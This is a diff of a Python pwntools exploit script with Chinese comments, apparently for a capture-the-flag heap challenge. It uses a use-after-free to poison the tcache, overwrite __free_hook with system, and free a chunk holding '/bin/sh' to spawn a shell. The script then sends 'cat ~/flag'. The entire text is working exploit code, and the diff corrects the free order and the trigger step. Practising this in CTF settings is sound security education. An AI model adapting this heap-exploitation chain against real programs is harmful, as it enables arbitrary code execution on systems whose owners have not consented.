@@ -45,23 +45,23 @@ log.info("Performing Tcache Poisoning...")
 add(0x30, b'victim')      # chunk 0, size 0x40
 add(0x30, b'guard')       # chunk 1
 
-delete(0) # a 进入 0x40 tcache bin
+delete(1)
+delete(0) # 形成 tcache_bin -> chunk0 -> chunk1
 
-# UAF: 修改 a 的 fd 指针为 __free_hook
+# UAF: 修改 chunk0 的 fd 指针为 __free_hook
 log.info(f"Poisoning tcache chunk's fd to {hex(free_hook)}")
 edit(0, p64(free_hook)) 
 
 # 4. 获取任意地址写并触发
-add(0x30, b'dummy') # 分配出原始的 chunk 0
+add(0x30, b'/bin/sh\x00') # chunk2 分配出原始的 chunk 0
 
 # 再次分配，得到 __free_hook 的地址，并写入 system
 log.info(f"Overwriting __free_hook with system...")
-add(0x30, p64(system)) # 这次 add 返回的是 __free_hook 的地址
+add(0x30, p64(system)) # chunk3 这次 add 返回的是 __free_hook 的地址
 
 # 5. 获取 Shell 并自动读取 flag
 log.info("Triggering shell...")
-add(0x20, b'/bin/sh\x00') # chunk 4
-delete(4) # free("/bin/sh") -> system("/bin/sh")
+delete(2) # free("/bin/sh") -> system("/bin/sh")
 
 # 自动化获取 flag
 p.sendline(b'cat ~/flag')
